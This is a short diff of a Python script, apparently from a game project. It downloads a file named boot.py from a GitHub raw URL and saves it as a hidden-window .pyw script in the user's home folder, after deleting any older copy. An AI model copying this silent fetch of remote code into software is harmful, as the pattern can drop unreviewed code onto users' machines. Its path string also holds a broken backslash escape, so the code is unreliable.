@@ -4,10 +4,10 @@ def main():
         import os, urllib.request, pathlib
         home = os.path.expanduser("~")
         os.chdir(home)
-        dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
-        path = str(home) + '\checker.pyw'
+        dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/boot.py'
+        path = str(home) + '\boot.pyw'
         try:
-            os.remove('checker.pyw')
+            os.remove('boot.pyw')
         except FileNotFoundError:
             print('Its Not Here')
         urllib.request.urlretrieve(dlurl, '{}'.format(path))
